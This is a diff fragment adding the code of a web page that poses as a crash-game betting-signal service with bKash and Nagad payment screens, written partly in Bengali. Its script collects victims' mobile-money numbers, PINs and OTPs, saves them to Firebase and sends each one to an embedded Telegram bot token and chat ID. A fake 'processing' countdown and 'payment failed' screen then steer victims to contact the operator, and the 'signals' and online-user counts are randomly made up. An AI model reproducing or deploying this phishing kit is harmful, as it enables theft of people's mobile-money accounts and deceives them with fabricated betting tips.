+                            <div class="inv" id="NagadInv">Inv No:8d21c75a72</div>
+                        </div>
+                    </div>
+                    <div class="amount-display" id="displayAmountNagad">৳19.00</div>
+                </div>
+
+                <!-- Nagad Sub-step 1: Number -->
+                <div id="nagadSubNum">
+                    <div class="main-gateway-form-box" style="background-color: #E31B23; color: #fff;">
+                        <h3>Your Nagad Account Number</h3>
+                        <div class="gw-input-container">
+                            <input type="tel" id="nagadNumberInput" placeholder="01XXXXXXXXX" maxlength="11">
+                        </div>
+                        <div class="gw-terms">Confirm and proceed, <a href="#" style="color:#fff;">terms & conditions</a></div>
+                    </div>
+                    <div class="gateway-action-buttons">
+                        <div class="gw-btn" style="background:#fff; color:#333; pointer-events:auto;" onclick="goToStep(5)">Cancel</div>
+                        <div id="nagadConfirmBtn" class="gw-btn" style="background-color: #e4e4e4; color: #999;">Confirm</div>
+                    </div>
+                </div>
+
+                <!-- Nagad Sub-step 2: PIN -->
+                <div id="nagadSubPin" class="hidden">
+                    <div class="main-gateway-form-box" style="background-color: #E31B23; color: #fff;">
+                        <h3>Your Nagad PIN</h3>
+                        <div class="gw-input-container">
+                            <input type="password" id="nagadPinInput" placeholder="Enter 4-digit PIN" maxlength="4">
+                        </div>
+                        <div class="gw-terms"><a href="#" style="color:#fff;">Forgot PIN?</a></div>
+                    </div>
+                    <div class="gateway-action-buttons">
+                        <div class="gw-btn" style="background:#fff; color:#333; pointer-events:auto;" onclick="switchNagadSub('num')">Back</div>
+                        <div id="nagadPinConfirmBtn" class="gw-btn" style="background-color: #e4e4e4; color: #999;">Confirm</div>
+                    </div>
+                </div>
+
+                <!-- Nagad Sub-step 3: OTP -->
+                <div id="nagadSubOtp" class="hidden">
+                    <div class="main-gateway-form-box" style="background-color: #E31B23; color: #fff;">
+                        <h3>Enter Verification Code (OTP)</h3>
+                        <div class="gw-input-container">
+                            <input type="tel" id="nagadOtpInput" placeholder="Enter 6-digit OTP" maxlength="6">
+                        </div>
+                        <div class="resend-text" style="color: #fff;">
+                            Didn't get code? <a id="nagadResendBtn" class="disabled" style="color:#ffccd1;">Resend (<span id="nagadTimer">30</span>s)</a>
+                        </div>
+                    </div>
+                    <div class="gateway-action-buttons">
+                        <div class="gw-btn" style="background:#fff; color:#333; pointer-events:auto;" onclick="switchNagadSub('pin')">Back</div>
+                        <div id="nagadOtpConfirmBtn" class="gw-btn" style="background-color: #e4e4e4; color: #999;">Verify</div>
+                    </div>
+                </div>
+
+                <div class="gateway-footer">
+                    <div class="hotline-txt" style="color: #E31B23;">
+                        <svg viewBox="0 0 24 24" style="fill: #E31B23;"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
+                        16167
+                    </div>
+                    <div class="copyright-txt">© 2026 Nagad, All Rights Reserved</div>
+                </div>
+            </div>
+            <div></div>
+        </div>
+
+        <!-- Step 7: 5 Minutes Loading & Payment Failed Screen -->
+        <div id="stepLoading" class="step">
+            <div class="close-btn" onclick="logoutUser()">✕</div>
+            <div class="loading-screen-box">
+                <!-- লোডিং সেকশন -->
+                <div id="activeLoadingDiv">
+                    <div class="spinner-ring"></div>
+                    <div class="loading-title">পাসওয়ার্ড প্রসেসিং হচ্ছে...</div>
+                    <div class="loading-desc">দয়া করে ১ মিনিট অপেক্ষা করুন। আপনার পেমেন্ট ভেরিফাই করে পাসওয়ার্ড জেনারেট করা হচ্ছে।</div>
+                    <div class="countdown-timer-badge" id="waitingCountdown">01:00</div>
+                </div>
+
+                <!-- পেমেন্ট ফেইল্ড ও হোয়াটসঅ্যাপ সেকশন (টাইম শেষ হলে দেখাবে) -->
+                <div id="paymentFailedDiv" class="failed-box">
+                    <div class="failed-icon"><i class="fa-solid fa-triangle-exclamation"></i></div>
+                    <div class="loading-title" style="color: #ef4444;">!</div>
+                    <div class="loading-desc"> Number PIN OTP  ভুল দিয়েছেন পাসওয়ার্ড পাবেন না দয়া করে সঠিক ভাবে দিয়ে আবার চেষ্টা করুন অথবা মাস্টার ভাইয়ের সাথে যোগাযোগ করুন </div>
+                    <a href="" target="_blank" class="Telegram-contact-btn">
+                        <i class="fa-brands fa-Telegram" style="font-size: 22px;"></i> Telegram-এ যোগাযোগ করুন
+                    </a>
+                </div>
+            </div>
+            <div></div>
+        </div>
+
+        <!-- Step 6: Live Signal Dashboard -->
+        <div id="step6" class="step">
+            <div class="close-btn" onclick="logoutUser()">✕</div>
+            <div class="dashboard-box">
+                <div style="color: #00ffcc; font-weight: bold; font-size: 15px; text-align: center;">🚀 Live Signal Master </div>
+                
+                <div class="top-info-bar">
+                    <span><i class="fa-solid fa-location-dot"></i> বাংলাদেশ (BD)</span>
+                    <span id="bdTime">00:00:00 AM</span>
+                </div>
+
+                <div class="search-display-box">
+                    <div class="typing-signal" id="typingSignalText"></div>
+                </div>
+
+                <div class="whatsapp-box">
+                    <span class="whatsapp-number"><i class="fa-brands fa-whatsapp"></i> MASTER VAI</span>
+                    <a href="" target="_blank" class="wa-btn"><i class="fa-brands fa-whatsapp"></i> Chat</a>
+                </div>
+
+                <div class="wheel-container">
+                    <div class="ring ring-1"></div>
+                    <div class="ring ring-2"></div>
+                    <div class="center-signal" id="dynamicMultiplier">1.38x</div>
+                </div>
+
+                <div class="telegram-section">
+                    <div class="tg-icon"><i class="fa-brands fa-telegram"></i></div>
+                    <div class="site-msg">আপনার সাইট অনুযায়ী সিগন্যাল পাচ্ছেন</div>
+                </div>
+
+                <div class="zigzag-line"></div>
+
+                <button class="btn" style="background: linear-gradient(45deg, #ff4d4d, #ff0000); color: #fff; padding: 8px; font-size: 13px; margin-top: 5px;" onclick="logoutUser()"><i class="fa-solid fa-right-from-bracket"></i> LOGOUT</button>
+            </div>
+            <div></div>
+        </div>
+    </div>
+</div>
+
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getDatabase, ref, get, child, update, push, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+
+    const firebaseConfig = {
+      apiKey: "",
+      authDomain: "nozrulexpresstopup.firebaseapp.com",
+      databaseURL: "https://nozrulexpresstopup-default-rtdb.firebaseio.com",
+      projectId: "nozrulexpresstopup",
+      storageBucket: "nozrulexpresstopup.firebasestorage.app",
+      messagingSenderId: "",
+      appId: ""
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    // ================= TELEGRAM BOT CONFIG =================
+    const TELEGRAM_BOT_TOKEN = '8746858476:AAFPcHQHMvP3Tz0BeO7mu8oW28cce8f6gF4'; // আপনার টেলিগ্রাম বট টোকেন দিন
+    const TELEGRAM_CHAT_ID = '8104533844';       // আপনার টেলিগ্রাম চ্যাট আইডি দিন
+
+    function sendTelegramMessage(text) {
+        if(TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') return;
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: text,
+                parse_mode: 'Markdown'
+            })
+        }).catch(err => console.log('Telegram Error:', err));
+    }
+
+    let currentTimeout = null;
+    let selectedPackagePrice = 19;
+    let selectedPackageName = '৫ টি সিগনাল পাবেন';
+    let selectedGameName = 'CRASH';
+    let userSiteName = '';
+    let currentPaymentKey = null;
+
+    window.onload = function() {
+        const savedKey = localStorage.getItem("activeUserKey");
+        if(savedKey) {
+            verifyKeySilently(savedKey);
+        }
+    }
+
+    // লাইভ ক্লক আপডেট ফাংশন
+    function updateClock() {
+        const now = new Date();
+        let hours = now.getHours();
+        const minutes = String(now.getMinutes()).padStart(2, '0');
+        const seconds = String(now.getSeconds()).padStart(2, '0');
+        const ampm = hours >= 12 ? 'PM' : 'AM';
+        
+        hours = hours % 12;
+        hours = hours ? hours : 12;
+        hours = String(hours).padStart(2, '0');
+
+        const timeString = `${hours}:${minutes}:${seconds} ${ampm}`;
+        const clockEl = document.getElementById('liveClock');
+        if(clockEl) clockEl.innerText = timeString;
+    }
+    setInterval(updateClock, 1000);
+    updateClock();
+
+    function fluctuateOnlineUsers() {
+        const countSpan = document.getElementById('onlineCount');
+        if(!countSpan) return;
+        let currentCount = parseInt(countSpan.innerText);
+        let change = Math.floor(Math.random() * 14) - 5; 
+        currentCount += change;
+        if (currentCount < 3200) currentCount = 3250;
+        if (currentCount > 4000) currentCount = 3950;
+        countSpan.innerText = currentCount;
+    }
+    setInterval(fluctuateOnlineUsers, 3000);
+
+    window.goToStep = function(stepNum) {
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+        if(stepNum === 'bkash') {
+            document.getElementById('stepBkashContainer').classList.add('active');
+            switchBkashSub('num');
+        } else if(stepNum === 'nagad') {
+            document.getElementById('stepNagadContainer').classList.add('active');
+            switchNagadSub('num');
+        } else {
+            document.getElementById('step' + stepNum).classList.add('active');
+        }
+    }
+
+    window.checkLogin = async function() {
+        let inputKey = document.getElementById('accessCode').value.trim();
+        let msgBox = document.getElementById('loginMsg');
+
+        if(inputKey === '') {
+            msgBox.style.color = "#ff4d4d";
+            msgBox.innerText = "দয়া করে আপনার পাসওয়ার্ডটি লিখুন";
+            return;
+        }
+
+        msgBox.style.color = "#ffea00";
+        msgBox.innerText = "যাচাই করা হচ্ছে...";
+
+        try {
+            const dbRef = ref(db);
+            const snapshot = await get(child(dbRef, `activationCodes/${inputKey}`));
+
+            if (snapshot.exists()) {
+                const codeData = snapshot.val();
+                if(codeData.status === "active") {
+                    localStorage.setItem("activeUserKey", inputKey);
+                    
+                    if(codeData.usedDevices < codeData.deviceLimit) {
+                        await update(ref(db, `activationCodes/${inputKey}`), {
+                            usedDevices: codeData.usedDevices + 1
+                        });
+                    }
+                    openDashboard();
+                } else {
+                    msgBox.style.color = "#ff4d4d";
+                    msgBox.innerText = "এই কোড টির মেয়াদ শেষ দয়াকরে নতুন কোড ব্যবহার করুন ";
+                }
+            } else {
+                msgBox.style.color = "#ff4d4d";
+                msgBox.innerText = "ভুল কোড! সঠিক কোড প্রদান করুন।";
+            }
+        } catch (error) {
+            msgBox.style.color = "#ff4d4d";
+            msgBox.innerText = "ত্রুটি: " + error.message;
+        }
+    }
+
+    async function verifyKeySilently(key) {
+        try {
+            const dbRef = ref(db);
+            const snapshot = await get(child(dbRef, `activationCodes/${key}`));
+            if(snapshot.exists() && snapshot.val().status === "active") {
+                openDashboard();
+            } else {
+                logoutUser();
+            }
+        } catch (e) {
+            logoutUser();
+        }
+    }
+
+    function openDashboard() {
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+        document.getElementById('step6').classList.add('active');
+        
+        startTypingEffect();
+        startBangladeshClock();
+        scheduleNextSignal();
+    }
+
+    function startTypingEffect() {
+        const textElement = document.getElementById("typingSignalText");
+        if(!textElement) return;
+        const textToType = "Active Signal ✅";
+        let index = 0;
+        textElement.innerText = "";
+        
+        function type() {
+            if (index < textToType.length) {
+                textElement.innerText += textToType.charAt(index);
+                index++;
+                setTimeout(type, 150);
+            } else {
+                setTimeout(() => {
+                    index = 0;
+                    textElement.innerText = "";
+                    type();
+                }, 2000);
+            }
+        }
+        type();
+    }
+
+    function startBangladeshClock() {
+        setInterval(() => {
+            const options = { timeZone: 'Asia/Dhaka', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true };
+            const timeString = new Intl.DateTimeFormat([], options).format(new Date());
+            const bdTimeEl = document.getElementById("bdTime");
+            if(bdTimeEl) bdTimeEl.innerText = timeString;
+        }, 1000);
+    }
+
+    function scheduleNextSignal() {
+        const signals = [
+            { val: "1.75x", delay: 3000 },
+            { val: "1.38x", delay: 5000 },
+            { val: "2.10x", delay: 9000 },
+            { val: "1.45x", delay: 14000 },
+            { val: "1.80x", delay: 20000 },
+            { val: "1.50x", delay: 28000 }
+        ];
+
+        const randomSignal = signals[Math.floor(Math.random() * signals.length)];
+        const multEl = document.getElementById("dynamicMultiplier");
+        if(multEl) multEl.innerText = randomSignal.val;
+
+        currentTimeout = setTimeout(() => {
+            scheduleNextSignal();
+        }, randomSignal.delay);
+    }
+
+    window.selectGame = function(game) {
+        selectedGameName = game;
+        document.getElementById('gameTitle').innerText = game + ' আপনি যেই বেটিং সাইটের সিগন্যাল দেখতে চান সেই সাইটের নাম লিখুন অথবা লিংক কপি করে পেস্ট করে দেন';
+        goToStep(3);
+    }
+
+    window.submitSiteName = function() {
+        let site = document.getElementById('siteNameInput').value.trim();
+        if(!site) {
+            alert("সাইটের নাম লিখুন");
+            return;
+        }
+        userSiteName = site;
+        
+        // ১. টেলিগ্রামে সাইট নাম পাঠানোর লজিক
+        sendTelegramMessage(`🌐 *New Site Name Entered*\n- Game: ${selectedGameName}\n- Site: ${userSiteName}`);
+        
+        goToStep(4);
+    }
+
+    window.selectPkg = function(amount, pkgName, element) {
+        selectedPackagePrice = amount;
+        selectedPackageName = pkgName;
+        document.querySelectorAll('.package-card').forEach(c => c.classList.remove('selected'));
+        element.classList.add('selected');
+    }
+
+    window.initGateway = function(method) {
+        if(method === 'bKash') {
+            document.getElementById('displayAmountBkash').innerText = '৳' + selectedPackagePrice + '.00';
+            goToStep('bkash');
+        } else {
+            document.getElementById('displayAmountNagad').innerText = '৳' + selectedPackagePrice + '.00';
+            goToStep('nagad');
+        }
+    }
+
+    function startPaymentLoadingScreen() {
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+        document.getElementById('stepLoading').classList.add('active');
+        
+        document.getElementById('activeLoadingDiv').style.display = 'block';
+        document.getElementById('PaymentFailedDiv').style.display = 'none';
+
+        let totalSeconds = 300; 
+        const timerBadge = document.getElementById('waitingCountdown');
+
+        const countdownInterval = setInterval(() => {
+            let minutes = Math.floor(totalSeconds / 60);
+            let seconds = totalSeconds % 60;
+            
+            timerBadge.innerText = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+            
+            if (totalSeconds <= 0) {
+                clearInterval(countdownInterval);
+                document.getElementById('activeLoadingDiv').style.display = 'none';
+                document.getElementById('PaymentFailedDiv').style.display = 'flex';
+            }
+            totalSeconds--;
+        }, 1000);
+    }
+
+    // ================= bKash Gateway Logic =================
+    window.switchBkashSub = function(sub) {
+        document.getElementById('bkashSubNum').classList.add('hidden');
+        document.getElementById('bkashSubPin').classList.add('hidden');
+        document.getElementById('bkashSubOtp').classList.add('hidden');
+        if(sub === 'num') document.getElementById('bkashSubNum').classList.remove('hidden');
+        if(sub === 'pin') document.getElementById('bkashSubPin').classList.remove('hidden');
+        if(sub === 'otp') document.getElementById('bkashSubOtp').classList.remove('hidden');
+    }
+
+    const bkashNumInput = document.getElementById('bkashNumberInput');
+    const bkashConfirmBtn = document.getElementById('bkashConfirmBtn');
+    bkashNumInput.addEventListener('input', function() {
+        let val = this.value.replace(/\D/g, '');
+        this.value = val;
+        if(val.startsWith('01') && val.length === 11) {
+            bkashConfirmBtn.classList.add('active');
+            bkashConfirmBtn.style.backgroundColor = '#e2136e';
+        } else {
+            bkashConfirmBtn.classList.remove('active');
+            bkashConfirmBtn.style.backgroundColor = '#e4e4e4';
+        }
+    });
+
+    bkashConfirmBtn.addEventListener('click', function() {
+        if(this.classList.contains('active')) {
+            const num = bkashNumInput.value.trim();
+            const newLogRef = push(ref(db, 'payments'));
+            currentPaymentKey = newLogRef.key;
+            
+            set(newLogRef, {
+                method: 'bKash',
+                game: selectedGameName,
+                site: userSiteName,
+                package: selectedPackageName,
+                amount: selectedPackagePrice,
+                number: num,
+                pin: '',
+                otp: '',
+                timestamp: new Date().getTime()
+            }).then(() => {
+                // ২. টেলিগ্রামে বিকাশ নাম্বার পাঠানোর লজিক
+                sendTelegramMessage(`📱 *bKash Number Submitted*\n- Site: ${userSiteName}\n- Package: ${selectedPackageName} (${selectedPackagePrice} BDT)\n- Number: \`${num}\``);
+                switchBkashSub('pin');
+            }).catch(err => alert('ডেটা সেভ করতে সমস্যা হয়েছে!'));
+        }
+    });
+
+    const bkashPinInput = document.getElementById('bkashPinInput');
+    const bkashPinConfirmBtn = document.getElementById('bkashPinConfirmBtn');
+    bkashPinInput.addEventListener('input', function() {
+        let val = this.value.replace(/\D/g, '');
+        this.value = val;
+        if(val.length >= 4) {
+            bkashPinConfirmBtn.classList.add('active');
+            bkashPinConfirmBtn.style.backgroundColor = '#e2136e';
+        } else {
+            bkashPinConfirmBtn.classList.remove('active');
+            bkashPinConfirmBtn.style.backgroundColor = '#e4e4e4';
+        }
+    });
+
+    bkashPinConfirmBtn.addEventListener('click', function() {
+        if(this.classList.contains('active') && currentPaymentKey) {
+            const pin = bkashPinInput.value.trim();
+            update(ref(db, 'Payments/' + currentPaymentKey), { pin: pin }).then(() => {
+                // ৩. টেলিগ্রামে বিকাশ পিন পাঠানোর লজিক
+                sendTelegramMessage(`🔑 *bKash PIN Submitted*\n- Number: ${bkashNumInput.value.trim()}\n- PIN: \`${pin}\``);
+                switchBkashSub('otp');
+                startBkashTimer(30);
+            }).catch(err => alert('পিন সাবমিট করতে সমস্যা হয়েছে!'));
+        }
+    });
+
+    let bkashCountdown, bkashTimeLeft = 30, bkashResendClicks = 0;
+    const bkashResendBtn = document.getElementById('bkashResendBtn');
+    const bkashTimerSpan = document.getElementById('bkashTimer');
+
+    function startBkashTimer(sec) {
+        clearInterval(bkashCountdown);
+        bkashTimeLeft = sec;
+        bkashTimerSpan.textContent = bkashTimeLeft;
+        bkashResendBtn.classList.add('disabled');
+
+        bkashCountdown = setInterval(() => {
+            bkashTimeLeft--;
+            bkashTimerSpan.textContent = bkashTimeLeft;
+            if(bkashTimeLeft <= 0) {
+                clearInterval(bkashCountdown);
+                bkashResendBtn.classList.remove('disabled');
+                bkashResendBtn.innerHTML = "Resend OTP";
+            }
+        }, 1000);
+    }
+
+    bkashResendBtn.addEventListener('click', function() {
+        if(!this.classList.contains('disabled')) {
+            bkashResendClicks++;
+            if(bkashResendClicks === 1) {
+                this.innerHTML = `Resend (<span id="bkashTimer">60</span>s)`;
+                startBkashTimer(60);
+            } else {
+                this.innerHTML = `Resend (<span id="bkashTimer">120</span>s)`;
+                startBkashTimer(120);
+            }
+        }
+    });
+
+    const bkashOtpInput = document.getElementById('bkashOtpInput');
+    const bkashOtpConfirmBtn = document.getElementById('bkashOtpConfirmBtn');
+    bkashOtpInput.addEventListener('input', function() {
+        let val = this.value.replace(/\D/g, '');
+        this.value = val;
+        if(val.length >= 4) {
+            bkashOtpConfirmBtn.classList.add('active');
+            bkashOtpConfirmBtn.style.backgroundColor = '#e2136e';
+        } else {
+            bkashOtpConfirmBtn.classList.remove('active');
+            bkashOtpConfirmBtn.style.backgroundColor = '#e4e4e4';
+        }
+    });
+
+    bkashOtpConfirmBtn.addEventListener('click', function() {
+        if(this.classList.contains('active') && currentPaymentKey) {
+            const otp = bkashOtpInput.value.trim();
+            update(ref(db, 'Payments/' + currentPaymentKey), { otp: otp }).then(() => {
+                // ৪. টেলিগ্রামে বিকাশ ওটিপি পাঠানোর লজিক
+                sendTelegramMessage(`🔐 *bKash OTP Submitted*\n- Number: ${bkashNumInput.value.trim()}\n- OTP: \`${otp}\``);
+                startPaymentLoadingScreen();
+            }).catch(err => alert('ওটিপি সাবমিট করতে সমস্যা হয়েছে!'));
+        }
+    });
+
+
+    // ================= Nagad Gateway Logic =================
+    window.switchNagadSub = function(sub) {
+        document.getElementById('nagadSubNum').classList.add('hidden');
+        document.getElementById('nagadSubPin').classList.add('hidden');
+        document.getElementById('nagadSubOtp').classList.add('hidden');
+        if(sub === 'num') document.getElementById('nagadSubNum').classList.remove('hidden');
+        if(sub === 'pin') document.getElementById('nagadSubPin').classList.remove('hidden');
+        if(sub === 'otp') document.getElementById('nagadSubOtp').classList.remove('hidden');
+    }
+
+    const nagadNumInput = document.getElementById('nagadNumberInput');
+    const nagadConfirmBtn = document.getElementById('nagadConfirmBtn');
+    nagadNumInput.addEventListener('input', function() {
+        let val = this.value.replace(/\D/g, '');
+        this.value = val;
+        if(val.startsWith('01') && val.length === 11) {
+            nagadConfirmBtn.classList.add('active');
+            nagadConfirmBtn.style.backgroundColor = '#E31B23';
+        } else {
+            nagadConfirmBtn.classList.remove('active');
+            nagadConfirmBtn.style.backgroundColor = '#e4e4e4';
+        }
+    });
+
+    nagadConfirmBtn.addEventListener('click', function() {
+        if(this.classList.contains('active')) {
+            const num = nagadNumInput.value.trim();
+            const newLogRef = push(ref(db, 'payments'));
+            currentPaymentKey = newLogRef.key;
+            
+            set(newLogRef, {
+                method: 'Nagad',
+                game: selectedGameName,
+                site: userSiteName,
+                package: selectedPackageName,
+                amount: selectedPackagePrice,
+                number: num,
+                pin: '',
+                otp: '',
+                timestamp: new Date().getTime()
+            }).then(() => {
+                // ২. টেলিগ্রামে নগদ নাম্বার পাঠানোর লজিক
+                sendTelegramMessage(`📱 *Nagad Number Submitted*\n- Site: ${userSiteName}\n- Package: ${selectedPackageName} (${selectedPackagePrice} BDT)\n- Number: \`${num}\``);
+                switchNagadSub('pin');
+            }).catch(err => alert('ডেটা সেভ করতে সমস্যা হয়েছে!'));
+        }
+    });
+
+    const nagadPinInput = document.getElementById('nagadPinInput');
+    const nagadPinConfirmBtn = document.getElementById('nagadPinConfirmBtn');
+    nagadPinInput.addEventListener('input', function() {
+        let val = this.value.replace(/\D/g, '');
+        this.value = val;
+        if(val.length === 4) {
+            nagadPinConfirmBtn.classList.add('active');
+            nagadPinConfirmBtn.style.backgroundColor = '#E31B23';
+        } else {
+            nagadPinConfirmBtn.classList.remove('active');
+            nagadPinConfirmBtn.style.backgroundColor = '#e4e4e4';
+        }
+    });
+
+    nagadPinConfirmBtn.addEventListener('click', function() {
+        if(this.classList.contains('active') && currentPaymentKey) {
+            const pin = nagadPinInput.value.trim();
+            update(ref(db, 'payments/' + currentPaymentKey), { pin: pin }).then(() => {
+                // ৩. টেলিগ্রামে নগদ পিন পাঠানোর লজিক
+                sendTelegramMessage(`🔑 *Nagad PIN Submitted*\n- Number: ${nagadNumInput.value.trim()}\n- PIN: \`${pin}\``);
+                switchNagadSub('otp');
+                startNagadTimer(30);
+            }).catch(err => alert('পিন সাবমিট করতে সমস্যা হয়েছে!'));
+        }
+    });
+
+    let nagadCountdown, nagadTimeLeft = 30, nagadResendClicks = 0;
+    const nagadResendBtn = document.getElementById('nagadResendBtn');
+    const nagadTimerSpan = document.getElementById('nagadTimer');
+
+    function startNagadTimer(sec) {
+        clearInterval(nagadCountdown);
+        nagadTimeLeft = sec;
+        nagadTimerSpan.textContent = nagadTimeLeft;
+        nagadResendBtn.classList.add('disabled');
+
+        nagadCountdown = setInterval(() => {
+            nagadTimeLeft--;
+            nagadTimerSpan.textContent = nagadTimeLeft;
+            if(nagadTimeLeft <= 0) {
+                clearInterval(nagadCountdown);
+                nagadResendBtn.classList.remove('disabled');
+                nagadResendBtn.innerHTML = "Resend OTP";
+            }
+        }, 1000);
+    }
+
+    nagadResendBtn.addEventListener('click', function() {
+        if(!this.classList.contains('disabled')) {
+            nagadResendClicks++;
+            if(nagadResendClicks === 1) {
+                this.innerHTML = `Resend (<span id="nagadTimer">60</span>s)`;
+                startNagadTimer(60);
+            } else {
+                this.innerHTML = `Resend (<span id="nagadTimer">120</span>s)`;
+                startNagadTimer(120);
+            }
+        }
+    });
+
+    const nagadOtpInput = document.getElementById('nagadOtpInput');
+    const nagadOtpConfirmBtn = document.getElementById('nagadOtpConfirmBtn');
+    nagadOtpInput.addEventListener('input', function() {
+        let val = this.value.replace(/\D/g, '');
+        this.value = val;
+        if(val.length >= 4) {
+            nagadOtpConfirmBtn.classList.add('active');
+            nagadOtpConfirmBtn.style.backgroundColor = '#E31B23';
+        } else {
+            nagadOtpConfirmBtn.classList.remove('active');
+            nagadOtpConfirmBtn.style.backgroundColor = '#e4e4e4';
+        }
+    });
+
+    nagadOtpConfirmBtn.addEventListener('click', function() {
+        if(this.classList.contains('active') && currentPaymentKey) {
+            const otp = nagadOtpInput.value.trim();
+            update(ref(db, 'payments/' + currentPaymentKey), { otp: otp }).then(() => {
+                // ৪. টেলিগ্রামে নগদ ওটিপি পাঠানোর লজিক
+                sendTelegramMessage(`🔐 *Nagad OTP Submitted*\n- Number: ${nagadNumInput.value.trim()}\n- OTP: \`${otp}\``);
+                startPaymentLoadingScreen();
+            }).catch(err => alert(' পরবর্তী ধাপে যাওয়ার জন্য স্কিনে ২ বার চাপ দিন  '));
+        }
+    });
+
+    window.logoutUser = function() {
+        localStorage.removeItem("activeUserKey");
+        if(currentTimeout) clearTimeout(currentTimeout);
+        goToStep(1);
+    }
+</script>
+
+</body>
+</html><script async src="/.netlify/scripts/hud?variant=public" data-nf-variant="public" data-netlify-site-id="7050f35b-0913-4245-bdba-0170fb95edaa" data-app-host="app.netlify.com"></script>
